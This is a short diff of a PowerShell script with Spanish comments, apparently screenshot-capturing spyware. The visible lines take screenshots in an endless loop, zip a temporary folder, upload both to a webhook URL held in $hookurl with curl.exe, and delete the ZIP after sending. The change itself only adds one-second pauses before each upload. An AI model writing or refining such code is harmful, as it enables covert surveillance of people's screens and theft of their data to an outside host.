@@ -27,6 +27,7 @@ function TakeScreenshot {
     # Envía la captura de prueba si es la primera
     if ($counter -eq 1) {
         Write-Host "Enviando captura de prueba..."
+        Start-Sleep 1
         curl.exe -F "file1=@$Filett" $hookurl
     }
 }
@@ -72,6 +73,7 @@ while ($true) {
         [System.IO.Compression.ZipFile]::CreateFromDirectory($TempFolder, $ZipFile)
 
         Write-Host "Enviando archivo ZIP..."
+        Start-Sleep 1
         curl.exe -F "file1=@$ZipFile" $hookurl
 
         # Elimina el archivo ZIP después de enviarlo
